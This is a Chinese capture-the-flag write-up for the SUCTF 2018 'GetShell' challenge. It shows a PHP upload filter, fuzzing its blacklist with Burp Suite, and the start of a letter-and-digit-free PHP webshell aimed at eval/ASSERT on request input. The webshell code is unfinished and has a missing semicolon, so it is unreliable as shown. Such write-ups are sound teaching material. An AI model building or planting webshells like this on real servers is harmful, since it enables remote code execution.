# \[SUCTF 2018]GetShell

## \[SUCTF 2018]GetShell

## 考点

*

## wp

有个文件上传页面index.php?act=upload，给了一个检查语句

```php
if($contents=file_get_contents($_FILES["file"]["tmp_name"])){
    $data=substr($contents,5);
    foreach ($black_char as $b) {
        if (stripos($data, $b) !== false){
            die("illegal char");
        }
    }     
} 
```

读取上传文件开头第五个字符后的内容，然后进行黑名单判断。但是不知道黑名单是什么，需要试一下，测试的字符放后面了，放burpsuite里面爆破一下，记得在设置payload时把`payload encoding`取消打钩

![](<../.gitbook/assets/image (27).png>)

可以看到，上传的文件直接保存成php，所有的数字字母都被过滤。但是PHP中笔记关键的`[]()$~;`都没被过滤，这就回到了无字符RCE。

```
<?php
// eval($_GET[A]);
// ASSERT($_POST[_]);
$_=[];
$__.=$_;
$___=$__[$__==$_];// A
$____ = $___
$___++;$___++;$___++;$___++; // E
$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;// O
$___++; // P
$___++;$___++;// R
$___++; // S
$___++; // T


```

## 小结

* [一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
* [无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
